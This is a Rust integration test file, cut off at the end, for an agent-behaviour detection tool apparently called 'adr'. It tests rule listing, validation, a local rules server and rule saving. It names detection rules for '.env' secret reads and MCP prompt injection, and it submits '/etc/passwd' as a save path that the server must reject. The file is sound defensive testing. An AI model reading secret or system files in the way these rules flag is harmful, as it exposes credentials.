use super::*;

fn assert_diagnostic_only_scan(
    output: &std::process::Output,
    log_path: &Path,
    sentinel: &str,
) -> Value {
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    for text in [&stdout, &stderr] {
        for marker in [
            sentinel,
            "policy match accounting unavailable",
            "invalid regex",
            "unsupported detection_class",
            "RiskAccountingError",
            "Overflow",
        ] {
            assert!(!text.contains(marker), "diagnostic leaked: {marker}");
        }
    }
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    let accounting = &summary["detection_flow"]["policy_match_accounting"];
    assert_eq!(accounting["status"], "unavailable");
    for field in [
        "pre_policy_detection_candidate_count",
        "fully_filtered_detection_candidate_count",
        "filtered_rule_id_count",
    ] {
        assert!(accounting[field].is_null(), "{field} should be null");
    }
    assert_eq!(summary["detection_count"], 1);
    assert_eq!(summary["emitted_count"], 1);
    assert_eq!(summary["rule_count"], 1);
    assert_eq!(
        summary["detection_flow"]["effective_detection_candidate_count"],
        1
    );
    assert_eq!(summary["detection_flow"]["matched_rule_id_count"], 1);
    assert_eq!(
        summary["detection_flow"]["state_deduplicated_detection_count"],
        0
    );

    let events = fs::read_to_string(log_path)
        .expect("event log")
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let event_types = events
        .iter()
        .map(|event| event["event_type"].as_str().expect("event type"))
        .collect::<Vec<_>>();
    assert_eq!(event_types, vec!["health", "detection"]);
    assert_eq!(events[0]["scanner_error_count"], 0);
    assert!(!events.iter().any(|event| {
        matches!(
            event["event_type"].as_str(),
            Some("scanner_error" | "operational_alert")
        )
    }));
    let serialized_events = serde_json::to_string(&events).expect("serialize events");
    for marker in [
        sentinel,
        "policy match accounting unavailable",
        "invalid regex",
        "unsupported detection_class",
        "RiskAccountingError",
        "Overflow",
    ] {
        assert!(
            !serialized_events.contains(marker),
            "event diagnostic leaked: {marker}"
        );
    }
    summary
}

#[test]
fn rules_list_and_validate_default_rules() {
    let list = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "list"])
        .arg("--no-local-config")
        .output()
        .expect("run adr rules list");
    assert!(
        list.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&list.stderr)
    );
    let stdout = String::from_utf8_lossy(&list.stdout);
    assert!(stdout.contains("mcp.tool_metadata.prompt_injection"));
    assert!(stdout.contains("secret.env.read"));
    for line in stdout.lines().filter(|line| !line.is_empty()) {
        assert_eq!(
            line.split('\t').count(),
            5,
            "unexpected rule-list row: {line}"
        );
    }

    let validate = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "validate"])
        .arg("--no-local-config")
        .output()
        .expect("run adr rules validate");
    assert!(
        validate.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&validate.stderr)
    );
    let summary: Value = serde_json::from_slice(&validate.stdout).expect("summary json");
    assert_eq!(summary["status"], "ok");
    assert_eq!(summary["rule_count"], 18);
}

#[test]
fn rules_serve_exposes_read_only_rule_summary_endpoint() {
    let mut child = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "serve", "--addr", "127.0.0.1:0", "--once"])
        .arg("--no-local-config")
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn adr rules serve");
    let stdout = child.stdout.take().expect("server stdout");
    let mut reader = BufReader::new(stdout);
    let mut line = String::new();
    reader.read_line(&mut line).expect("read listen summary");
    let listen: Value = serde_json::from_str(line.trim()).expect("listen summary json");
    assert_eq!(listen["status"], "listening");
    let addr = listen["addr"].as_str().expect("listener addr");

    let mut stream = TcpStream::connect(addr).expect("connect rules server");
    stream
        .write_all(b"GET /api/rules HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
        .expect("write request");
    let mut response = String::new();
    stream.read_to_string(&mut response).expect("read response");
    assert!(response.starts_with("HTTP/1.1 200 OK"));
    assert!(response.contains("Content-Type: application/json"));
    let body = response
        .split_once("\r\n\r\n")
        .map(|(_, body)| body)
        .expect("response body");
    let summary: Value = serde_json::from_str(body).expect("rules json");
    assert_eq!(summary["status"], "ok");
    assert_eq!(summary["rule_count"], 18);
    assert!(
        summary["rules"]
            .as_array()
            .expect("rules array")
            .iter()
            .any(|rule| rule["id"] == "mcp.tool_metadata.prompt_injection")
    );

    let output = child.wait_with_output().expect("wait for rules server");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn rules_serve_uses_ordered_managed_pack_for_summary() {
    let mut child = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "serve",
            "--addr",
            "127.0.0.1:0",
            "--once",
            "--no-default-rules",
            "--config-dir",
            "tests/fixtures/rule_packs/ordered",
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn ordered rules serve");
    let stdout = child.stdout.take().expect("server stdout");
    let mut reader = BufReader::new(stdout);
    let mut line = String::new();
    reader.read_line(&mut line).expect("read listen summary");
    let listen: Value = serde_json::from_str(line.trim()).expect("listen summary json");
    let addr = listen["addr"].as_str().expect("listener addr");

    let response = rules_serve_request(addr, "GET", "/api/rules", None);
    assert!(response.starts_with("HTTP/1.1 200 OK"));
    let summary = json_response_body(&response);
    let rule = summary["rules"]
        .as_array()
        .expect("rules array")
        .iter()
        .find(|rule| rule["id"] == "secret.env.read")
        .expect("managed replacement rule");
    assert_eq!(rule["score"], 77);
    let provenance = summary["provenance"]
        .as_array()
        .expect("provenance array")
        .iter()
        .find(|entry| entry["id"] == "secret.env.read")
        .expect("replacement provenance");
    assert!(
        provenance["winner"]
            .as_str()
            .unwrap()
            .contains("deployment:")
    );

    let output = child
        .wait_with_output()
        .expect("wait for ordered rules server");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn scan_reports_consistent_hashed_rule_sources_and_replacements() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("empty-root");
    let state_path = temp.path().join("scan-state.json");
    fs::create_dir_all(&root).expect("empty root");
    let validation = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "validate",
            "--config-dir",
            "tests/fixtures/rule_packs/ordered",
        ])
        .output()
        .expect("validate ordered pack");
    assert!(
        validation.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&validation.stderr)
    );
    let validation: Value = serde_json::from_slice(&validation.stdout).expect("validation json");
    let expected_sources = validation["sources"]
        .as_array()
        .expect("validation sources")
        .iter()
        .map(|source| Value::String(evidence_hash(source.as_str().expect("raw source"))))
        .collect::<Vec<_>>();
    let expected_provenance = validation["provenance"]
        .as_array()
        .expect("validation provenance")
        .iter()
        .map(|entry| {
            serde_json::json!({
                "id": entry["id"],
                "kind": entry["kind"],
                "winner": evidence_hash(entry["winner"].as_str().expect("raw winner")),
                "replaced_sources": entry["replaced_sources"]
                    .as_array()
                    .expect("raw replacements")
                    .iter()
                    .map(|source| evidence_hash(source.as_str().expect("raw replacement")))
                    .collect::<Vec<_>>(),
            })
        })
        .collect::<Vec<_>>();

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["scan", "--once", "--dry-run", "--root"])
        .arg(&root)
        .args([
            "--config-dir",
            "tests/fixtures/rule_packs/ordered",
            "--install-inventory-disabled",
            "--state-path",
        ])
        .arg(&state_path)
        .output()
        .expect("run ordered pack scan");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    let rules = &summary["effective_configuration"]["rules"];
    let sources = rules["sources"].as_array().expect("hashed sources");
    assert_eq!(sources, &expected_sources);
    let provenance = rules["provenance"].as_array().expect("provenance");
    assert_eq!(provenance, &expected_provenance);
}

#[test]
fn rules_serve_validates_submitted_rule_yaml_without_writing() {
    let rules_yaml =
        fs::read_to_string("tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml")
            .expect("read custom rules");
    let body = serde_json::json!({ "rules_yaml": rules_yaml }).to_string();
    let (response, output) = post_rules_serve_once("/api/rules/validate", &body);

    assert!(response.starts_with("HTTP/1.1 200 OK"));
    assert!(response.contains("Content-Type: application/json"));
    let summary = json_response_body(&response);
    assert_eq!(summary["status"], "ok");
    assert_eq!(summary["rule_count"], 1);
    assert_eq!(summary["rules"][0]["id"], "custom.agent.malicious_behavior");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn rules_serve_previews_matches_against_fixture_only_path() {
    let rules_yaml =
        fs::read_to_string("tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml")
            .expect("read custom rules");
    let body = serde_json::json!({
        "rules_yaml": rules_yaml,
        "fixture_path": "tests/fixtures/custom_rules/custom-agent-behavior.jsonl",
    })
    .to_string();
    let (response, output) = post_rules_serve_once("/api/rules/preview", &body);

    assert!(response.starts_with("HTTP/1.1 200 OK"));
    let summary = json_response_body(&response);
    assert_eq!(summary["status"], "ok");
    assert_eq!(summary["match_count"], 1);
    assert!(
        summary["matches"][0]["rule_ids"]
            .as_array()
            .expect("rule ids array")
            .iter()
            .any(|rule| rule == "custom.agent.malicious_behavior")
    );
    assert_eq!(
        summary["fixture_path"],
        "tests/fixtures/custom_rules/custom-agent-behavior.jsonl"
    );
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn rules_serve_rejects_preview_paths_outside_fixtures() {
    let body = serde_json::json!({ "fixture_path": "Cargo.toml" }).to_string();
    let (response, output) = post_rules_serve_once("/api/rules/preview", &body);

    assert!(response.starts_with("HTTP/1.1 400 Bad Request"));
    let summary = json_response_body(&response);
    assert_eq!(summary["status"], "error");
    assert!(
        summary["error"]
            .as_str()
            .expect("error string")
            .contains("preview fixture must be under tests/fixtures")
    );
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

fn post_rules_serve_once(path: &str, body: &str) -> (String, std::process::Output) {
    let mut child = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "serve",
            "--addr",
            "127.0.0.1:0",
            "--once",
            "--no-local-config",
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn adr rules serve");
    let stdout = child.stdout.take().expect("server stdout");
    let mut reader = BufReader::new(stdout);
    let mut line = String::new();
    reader.read_line(&mut line).expect("read listen summary");
    let listen: Value = serde_json::from_str(line.trim()).expect("listen summary json");
    let addr = listen["addr"].as_str().expect("listener addr");

    let mut stream = TcpStream::connect(addr).expect("connect rules server");
    let request = format!(
        "POST {path} HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    stream.write_all(request.as_bytes()).expect("write request");
    let mut response = String::new();
    stream.read_to_string(&mut response).expect("read response");

    let output = child.wait_with_output().expect("wait for rules server");
    (response, output)
}

fn json_response_body(response: &str) -> Value {
    let body = response
        .split_once("\r\n\r\n")
        .map(|(_, body)| body)
        .expect("response body");
    serde_json::from_str(body).expect("json response")
}

fn post_rules_serve_save(
    body: &str,
    rule_file: &std::path::Path,
) -> (String, std::process::Output) {
    post_rules_serve_save_with_mode(body, rule_file, true)
}

fn post_rules_serve_save_with_defaults(
    body: &str,
    rule_file: &std::path::Path,
) -> (String, std::process::Output) {
    post_rules_serve_save_with_mode(body, rule_file, false)
}

fn post_rules_serve_save_with_mode(
    body: &str,
    rule_file: &std::path::Path,
    no_default_rules: bool,
) -> (String, std::process::Output) {
    let mut args = vec![
        "rules".to_string(),
        "serve".to_string(),
        "--addr".to_string(),
        "127.0.0.1:0".to_string(),
        "--once".to_string(),
        "--no-local-config".to_string(),
    ];
    if no_default_rules {
        args.push("--no-default-rules".to_string());
    }
    args.extend([
        "--rules".to_string(),
        rule_file.to_string_lossy().to_string(),
    ]);

    let mut child = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn adr rules serve");
    let stdout = child.stdout.take().expect("server stdout");
    let mut reader = BufReader::new(stdout);
    let mut line = String::new();
    reader.read_line(&mut line).expect("read listen summary");
    let listen: Value = serde_json::from_str(line.trim()).expect("listen summary json");
    let addr = listen["addr"].as_str().expect("listener addr");

    let mut stream = TcpStream::connect(addr).expect("connect rules server");
    let request = format!(
        "POST /api/rules/save HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    stream.write_all(request.as_bytes()).expect("write request");
    let mut response = String::new();
    stream.read_to_string(&mut response).expect("read response");

    let output = child.wait_with_output().expect("wait for rules server");
    (response, output)
}

fn post_rules_serve_save_with_args(body: &str, args: &[String]) -> (String, std::process::Output) {
    let mut command_args = vec![
        "rules".to_string(),
        "serve".to_string(),
        "--addr".to_string(),
        "127.0.0.1:0".to_string(),
        "--once".to_string(),
    ];
    command_args.extend_from_slice(args);

    let mut child = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(command_args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn adr rules serve");
    let stdout = child.stdout.take().expect("server stdout");
    let mut reader = BufReader::new(stdout);
    let mut line = String::new();
    reader.read_line(&mut line).expect("read listen summary");
    let listen: Value = serde_json::from_str(line.trim()).expect("listen summary json");
    let addr = listen["addr"].as_str().expect("listener addr");

    let mut stream = TcpStream::connect(addr).expect("connect rules server");
    let request = format!(
        "POST /api/rules/save HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    stream.write_all(request.as_bytes()).expect("write request");
    let mut response = String::new();
    stream.read_to_string(&mut response).expect("read response");

    let output = child.wait_with_output().expect("wait for rules server");
    (response, output)
}

fn custom_rule_yaml(id: &str, regex: &str) -> String {
    format!(
        r#"version: 1
description: Test custom rule.
defaults:
  case_insensitive: true
  enabled: true
rules:
  - id: {id}
    category: custom_agent_behavior
    severity: low
    score: 10
    targets: [command]
    regex: '{regex}'
    tags: [test]
    explanation: Test rule.
modifiers: []
"#
    )
}

fn rules_serve_request(addr: &str, method: &str, path: &str, body: Option<&str>) -> String {
    let mut stream = TcpStream::connect(addr).expect("connect rules server");
    let request = if let Some(body) = body {
        format!(
            "{method} {path} HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        )
    } else {
        format!("{method} {path} HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
    };
    stream.write_all(request.as_bytes()).expect("write request");
    let mut response = String::new();
    stream.read_to_string(&mut response).expect("read response");
    response
}

#[test]
fn rules_serve_save_writes_validated_rules_and_creates_backup() {
    let dir = tempdir().expect("temp dir");
    let rule_file = dir.path().join("tool-call-regex.yaml");
    let original =
        fs::read_to_string("config/rules/tool-call-regex.yaml").expect("read default rules");
    fs::write(&rule_file, &original).expect("copy rules to temp");

    let custom_rules =
        fs::read_to_string("tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml")
            .expect("read custom rules");
    let body = serde_json::json!({ "rules_yaml": custom_rules }).to_string();
    let (response, output) = post_rules_serve_save(&body, &rule_file);

    assert!(response.starts_with("HTTP/1.1 200 OK"));
    let summary = json_response_body(&response);
    assert_eq!(summary["status"], "ok");
    assert_eq!(summary["rule_count"], 1);
    assert!(
        summary["saved"]
            .as_str()
            .expect("saved path")
            .ends_with("tool-call-regex.yaml")
    );

    // Verify the file was actually written.
    let saved = fs::read_to_string(&rule_file).expect("read saved file");
    assert_eq!(saved, custom_rules);

    // Verify backup was created.
    let backup = dir.path().join("tool-call-regex.yaml.bak");
    assert!(backup.exists(), "backup file should exist");
    let backup_content = fs::read_to_string(&backup).expect("read backup");
    assert_eq!(backup_content, original);

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn rules_serve_save_reloads_rules_without_restart() {
    let dir = tempdir().expect("temp dir");
    let rule_file = dir.path().join("tool-call-regex.yaml");
    let original =
        fs::read_to_string("config/rules/tool-call-regex.yaml").expect("read default rules");
    fs::write(&rule_file, &original).expect("copy rules to temp");

    let mut child = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "serve",
            "--addr",
            "127.0.0.1:0",
            "--no-local-config",
            "--no-default-rules",
            "--rules",
            &rule_file.to_string_lossy(),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn adr rules serve");
    let stdout = child.stdout.take().expect("server stdout");
    let mut reader = BufReader::new(stdout);
    let mut line = String::new();
    reader.read_line(&mut line).expect("read listen summary");
    let listen: Value = serde_json::from_str(line.trim()).expect("listen summary json");
    let addr = listen["addr"].as_str().expect("listener addr");

    let custom_rules =
        fs::read_to_string("tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml")
            .expect("read custom rules");
    let save_body = serde_json::json!({ "rules_yaml": custom_rules }).to_string();
    let save_response = rules_serve_request(addr, "POST", "/api/rules/save", Some(&save_body));
    assert!(save_response.starts_with("HTTP/1.1 200 OK"));

    let rules_response = rules_serve_request(addr, "GET", "/api/rules", None);
    assert!(rules_response.starts_with("HTTP/1.1 200 OK"));
    let rules_summary = json_response_body(&rules_response);
    assert_eq!(rules_summary["status"], "ok");
    assert_eq!(rules_summary["rule_count"], 1);
    assert_eq!(
        rules_summary["rules"][0]["id"],
        "custom.agent.malicious_behavior"
    );

    let preview_body = serde_json::json!({
        "fixture_path": "tests/fixtures/custom_rules/custom-agent-behavior.jsonl",
    })
    .to_string();
    let preview_response =
        rules_serve_request(addr, "POST", "/api/rules/preview", Some(&preview_body));
    assert!(preview_response.starts_with("HTTP/1.1 200 OK"));
    let preview_summary = json_response_body(&preview_response);
    assert_eq!(preview_summary["status"], "ok");
    assert_eq!(preview_summary["match_count"], 1);
    assert_eq!(
        preview_summary["matches"][0]["rule_ids"][0],
        "custom.agent.malicious_behavior"
    );

    child.kill().expect("stop rules server");
    let output = child.wait_with_output().expect("wait for rules server");
    assert!(
        String::from_utf8_lossy(&output.stderr).is_empty(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn rules_serve_save_rejects_invalid_yaml() {
    let dir = tempdir().expect("temp dir");
    let rule_file = dir.path().join("tool-call-regex.yaml");
    let original =
        fs::read_to_string("config/rules/tool-call-regex.yaml").expect("read default rules");
    fs::write(&rule_file, &original).expect("copy rules to temp");

    let body = serde_json::json!({ "rules_yaml": "not: valid: yaml: [broken" }).to_string();
    let (response, output) = post_rules_serve_save(&body, &rule_file);

    assert!(response.starts_with("HTTP/1.1 400 Bad Request"));
    let summary = json_response_body(&response);
    assert_eq!(summary["status"], "error");
    assert!(!summary["error"].as_str().expect("error string").is_empty());

    // Original file should be unchanged.
    let current = fs::read_to_string(&rule_file).expect("read file after rejected save");
    assert_eq!(current, original);

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn rules_serve_save_rejects_duplicate_bundled_rule_before_writing() {
    let dir = tempdir().expect("temp dir");
    let rule_file = dir.path().join("custom-rules.yaml");
    let original =
        fs::read_to_string("tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml")
            .expect("read custom rules");
    fs::write(&rule_file, &original).expect("write initial custom rules");

    let duplicate_bundled_rule = r#"version: 1
description: Duplicate a bundled rule id.
defaults:
  case_insensitive: true
  enabled: true
rules:
  - id: secret.env.read
    category: secret_access
    severity: medium
    score: 35
    targets: [command]
    regex: '\.env'
    tags: [test]
    explanation: Duplicate bundled id for regression coverage.
modifiers: []
"#;
    let body = serde_json::json!({ "rules_yaml": duplicate_bundled_rule }).to_string();
    let (response, output) = post_rules_serve_save_with_defaults(&body, &rule_file);

    assert!(response.starts_with("HTTP/1.1 400 Bad Request"));
    let summary = json_response_body(&response);
    assert_eq!(summary["status"], "error");
    assert!(
        summary["error"]
            .as_str()
            .expect("error string")
            .contains("duplicate rule id: secret.env.read")
    );

    let current = fs::read_to_string(&rule_file).expect("read file after rejected save");
    assert_eq!(current, original);
    assert!(!rule_file.with_extension("yaml.bak").exists());

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn rules_serve_save_rejects_when_no_editable_rules_path_is_configured() {
    let custom_rules =
        fs::read_to_string("tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml")
            .expect("read custom rules");
    let body = serde_json::json!({ "rules_yaml": custom_rules }).to_string();
    let (response, output) = post_rules_serve_once("/api/rules/save", &body);

    assert!(response.starts_with("HTTP/1.1 400 Bad Request"));
    let summary = json_response_body(&response);
    assert_eq!(summary["status"], "error");
    assert!(
        summary["error"]
            .as_str()
            .expect("error string")
            .contains("no editable --rules path configured")
    );
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn rules_serve_save_rejects_discovered_only_rules_path() {
    let temp = tempdir().expect("temp dir");
    let config_root = temp.path().join("config");
    let discovered_file = config_root.join("rules.d/discovered.yaml");
    fs::create_dir_all(discovered_file.parent().expect("rules dir")).expect("rules dir");
    let discovered_original = custom_rule_yaml("custom.discovered.local", "discovered-local");
    fs::write(&discovered_file, &discovered_original).expect("write discovered rule");

    let replacement = custom_rule_yaml("custom.discovered.replacement", "discovered-replacement");
    let body = serde_json::json!({ "rules_yaml": replacement }).to_string();
    let args = vec![
        "--no-default-rules".to_string(),
        "--config-dir".to_string(),
        config_root.to_string_lossy().to_string(),
    ];
    let (response, output) = post_rules_serve_save_with_args(&body, &args);

    assert!(response.starts_with("HTTP/1.1 400 Bad Request"));
    let summary = json_response_body(&response);
    assert_eq!(summary["status"], "error");
    assert!(
        summary["error"]
            .as_str()
            .expect("error string")
            .contains("no editable --rules path configured")
    );
    assert_eq!(
        fs::read_to_string(&discovered_file).expect("read discovered rule"),
        discovered_original
    );
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn rules_serve_save_without_path_writes_explicit_rules_not_discovered_rules() {
    let temp = tempdir().expect("temp dir");
    let config_root = temp.path().join("config");
    let discovered_file = config_root.join("rules.d/discovered.yaml");
    fs::create_dir_all(discovered_file.parent().expect("rules dir")).expect("rules dir");
    let discovered_original = custom_rule_yaml("custom.discovered.local", "discovered-local");
    fs::write(&discovered_file, &discovered_original).expect("write discovered rule");

    let explicit_file = temp.path().join("explicit.yaml");
    let explicit_original = custom_rule_yaml("custom.explicit.local", "explicit-local");
    fs::write(&explicit_file, &explicit_original).expect("write explicit rule");

    let replacement = custom_rule_yaml("custom.explicit.replacement", "explicit-replacement");
    let body = serde_json::json!({ "rules_yaml": replacement }).to_string();
    let args = vec![
        "--no-default-rules".to_string(),
        "--config-dir".to_string(),
        config_root.to_string_lossy().to_string(),
        "--rules".to_string(),
        explicit_file.to_string_lossy().to_string(),
    ];
    let (response, output) = post_rules_serve_save_with_args(&body, &args);

    assert!(response.starts_with("HTTP/1.1 200 OK"));
    let summary = json_response_body(&response);
    assert_eq!(summary["status"], "ok");
    assert_eq!(summary["saved"], explicit_file.display().to_string());
    assert_eq!(
        fs::read_to_string(&explicit_file).expect("read explicit rule"),
        replacement
    );
    assert_eq!(
        fs::read_to_string(&discovered_file).expect("read discovered rule"),
        discovered_original
    );
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn rules_serve_save_rejects_requested_discovered_only_path() {
    let temp = tempdir().expect("temp dir");
    let config_root = temp.path().join("config");
    let discovered_file = config_root.join("rules.d/discovered.yaml");
    fs::create_dir_all(discovered_file.parent().expect("rules dir")).expect("rules dir");
    let discovered_original = custom_rule_yaml("custom.discovered.local", "discovered-local");
    fs::write(&discovered_file, &discovered_original).expect("write discovered rule");

    let explicit_file = temp.path().join("explicit.yaml");
    let explicit_original = custom_rule_yaml("custom.explicit.local", "explicit-local");
    fs::write(&explicit_file, &explicit_original).expect("write explicit rule");

    let replacement = custom_rule_yaml("custom.discovered.replacement", "discovered-replacement");
    let body = serde_json::json!({
        "rules_yaml": replacement,
        "path": discovered_file,
    })
    .to_string();
    let args = vec![
        "--no-default-rules".to_string(),
        "--config-dir".to_string(),
        config_root.to_string_lossy().to_string(),
        "--rules".to_string(),
        explicit_file.to_string_lossy().to_string(),
    ];
    let (response, output) = post_rules_serve_save_with_args(&body, &args);

    assert!(response.starts_with("HTTP/1.1 400 Bad Request"));
    let summary = json_response_body(&response);
    assert_eq!(summary["status"], "error");
    let error = summary["error"].as_str().expect("error string");
    assert!(error.contains("not one of the loaded rule files"));
    assert!(error.contains("editable via --rules"));
    assert_eq!(
        fs::read_to_string(&discovered_file).expect("read discovered rule"),
        discovered_original
    );
    assert_eq!(
        fs::read_to_string(&explicit_file).expect("read explicit rule"),
        explicit_original
    );
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn rules_serve_save_validates_active_overrides_before_writing() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let override_path = config_root.join("overrides.d/custom-override.yaml");
    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
    fs::write(
        &override_path,
        r#"version: 1
overrides:
  - rule_id: custom.override.target
    enabled: false
    reason: Test override should be validated before save.
"#,
    )
    .expect("write override");
    let rule_file = temp.path().join("editable.yaml");
    let original_yaml = custom_rule_yaml("custom.override.target", "override-target");
    fs::write(&rule_file, &original_yaml).expect("write editable rule");
    let replacement_yaml = custom_rule_yaml("custom.override.replacement", "replacement");
    let body = serde_json::json!({
        "path": rule_file.display().to_string(),
        "rules_yaml": replacement_yaml,
    })
    .to_string();
    let args = vec![
        "--config-dir".to_string(),
        config_root.to_string_lossy().to_string(),
        "--no-default-rules".to_string(),
        "--rules".to_string(),
        rule_file.to_string_lossy().to_string(),
    ];

    let (response, output) = post_rules_serve_save_with_args(&body, &args);
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(response.starts_with("HTTP/1.1 400 Bad Request"));
    let body = json_response_body(&response);
    assert!(
        body["error"]
            .as_str()
            .expect("error")
            .contains("unknown rule_id 'custom.override.target'")
    );
    assert_eq!(
        fs::read_to_string(&rule_file).expect("editable rule unchanged"),
        original_yaml
    );
    assert!(!rule_file.with_extension("yaml.bak").exists());
}

#[test]
fn rules_serve_save_rejects_path_not_in_loaded_rules() {
    let dir = tempdir().expect("temp dir");
    let rule_file = dir.path().join("tool-call-regex.yaml");
    let original =
        fs::read_to_string("config/rules/tool-call-regex.yaml").expect("read default rules");
    fs::write(&rule_file, &original).expect("copy rules to temp");

    let custom_rules =
        fs::read_to_string("tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml")
            .expect("read custom rules");
    let body = serde_json::json!({
        "rules_yaml": custom_rules,
        "path": "/etc/passwd",
    })
    .to_string();
    let (response, output) = post_rules_serve_save(&body, &rule_file);

    assert!(response.starts_with("HTTP/1.1 400 Bad Request"));
    let summary = json_response_body(&response);
    assert_eq!(summary["status"], "error");
    assert!(
        summary["error"]
            .as_str()
            .expect("error string")
            .contains("not one of the loaded rule files")
    );

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn rules_validate_reports_invalid_custom_regex() {
    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "validate",
            "--no-local-config",
            "--rules",
            "tests/fixtures/custom_rules/invalid-regex.yaml",
        ])
        .output()
        .expect("run adr rules validate");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("custom.invalid_regex"));
}

#[test]
fn rules_validate_reports_unsupported_targets() {
    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "validate",
            "--no-local-config",
            "--rules",
            "tests/fixtures/custom_rules/unsupported-target.yaml",
        ])
        .output()
        .expect("run adr rules validate");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("custom.unsupported_target"));
    assert!(stderr.contains("unsupported target 'raw_transcript'"));
    assert!(stderr.contains("supported targets"));
}

#[test]
fn rules_test_supports_sigma_inspired_custom_yaml() {
    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "test",
            "tests/fixtures/custom_rules/custom-agent-behavior.jsonl",
            "--no-local-config",
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
        ])
        .output()
        .expect("run adr rules test");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["match_count"], 1);
    assert!(
        summary["matches"][0]["rule_ids"]
            .as_array()
            .expect("rule ids array")
            .iter()
            .any(|rule| rule == "custom.agent.malicious_behavior")
    );
    assert!(
        summary["matches"][0]["categories"]
            .as_array()
            .expect("categories array")
            .iter()
            .any(|category| category == "custom_agent_behavior")
    );
}

#[test]
fn rules_validate_adds_custom_rules_to_bundled_defaults_unless_disabled() {
